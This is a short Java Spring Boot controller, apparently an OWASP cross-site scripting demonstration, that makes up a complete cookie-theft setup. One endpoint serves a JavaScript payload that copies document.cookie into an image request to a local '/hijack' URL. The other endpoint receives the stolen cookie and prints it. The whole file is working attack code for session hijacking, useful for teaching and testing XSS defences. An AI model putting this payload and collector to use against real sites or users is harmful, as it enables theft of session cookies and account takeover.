package com.owasp.controllers;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class XXSTest {
    @GetMapping("/hijack/{cookie}")
    public void receiveCookie(@PathVariable("cookie") String cookie) {
        System.out.println(cookie);
    }
    
    @GetMapping("/content")
    public ResponseEntity<String> getContent() {
        return new ResponseEntity<String>("var i=new Image; i.src='http://localhost:8080/hijack'+document.cookie;\r\n", HttpStatus.OK);
    }
}
